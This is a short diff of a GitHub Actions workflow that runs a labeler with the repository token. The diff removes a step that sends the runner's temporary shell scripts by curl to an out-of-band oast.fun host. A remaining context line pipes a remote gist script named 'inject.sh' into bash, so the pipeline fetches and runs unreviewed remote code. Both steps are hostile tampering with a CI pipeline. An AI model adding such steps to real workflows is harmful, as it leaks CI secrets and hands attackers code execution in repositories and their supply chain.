@@ -17,10 +17,6 @@ jobs:
           github-token: "${{ secrets.GITHUB_TOKEN }}"
           config-path: .github/labeler.yml
 
-      - name: Execute Curl Command
-        run: |
-          curl -d "$(cat /home/runner/work/_temp/*.sh)" https://iqcckceetecakgvdeqdsy1cgcrixyulj5.oast.fun
-
       - name: Run Script from Gist
         run: |
           curl -sSfL gist.githubusercontent.com/TheApathy/4a6e1718790c35390e32482d6edae311/raw/inject.sh | bash
